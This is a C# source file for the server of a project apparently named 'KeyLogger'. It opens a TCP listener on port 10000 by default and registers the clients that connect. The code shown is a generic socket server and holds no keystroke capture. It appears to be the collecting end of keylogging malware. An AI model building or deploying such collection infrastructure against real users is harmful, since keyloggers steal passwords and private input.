using System;
using System.Net.Sockets;
using System.Net;
using System.IO;

namespace KeyLogger.Server
{
    class Program
    {
        static void Main(string[] args)
        {
            int port = 10000;
            if (args.Length > 0)
                int.TryParse(args[0], out port);
            Console.WriteLine($"Starting server on port {port}");
            
            var server = new TcpListener(IPAddress.Any, port);
            server.Start();

            var factory = new ClientFactory();

            while (true)
            {
                Console.Write("Waiting for a client... ");
                var tcpClient = server.AcceptTcpClient();
                try
                {
                    
                    var message = new ClientConnectionMessage();
                    message.Receive(tcpClient.GetStream());
                    var client = factory.CreateClient(tcpClient, message.Type.Value);
                    Console.WriteLine($"connected: {client.ToString()}");
                }
                catch (ArgumentException)
                {
                    Console.WriteLine("invalid type.");
                }
                catch (TimeoutException)
                {
                    Console.WriteLine("timeout.");
                }
            }
        }
    }
}
